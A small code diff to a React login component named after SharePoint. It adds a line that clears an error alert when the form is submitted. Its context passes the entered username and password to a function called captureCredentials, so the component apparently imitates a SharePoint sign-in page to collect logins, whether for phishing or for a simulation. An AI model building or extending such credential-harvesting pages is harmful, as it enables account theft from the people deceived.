@@ -33,6 +33,7 @@ export default function SharePointLoginPage() {
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
     setIsLoading(true);
+    setShowErrorAlert(false);
     try {
       // Send credentials to the server-side flow.
       await captureCredentials({ username, password });
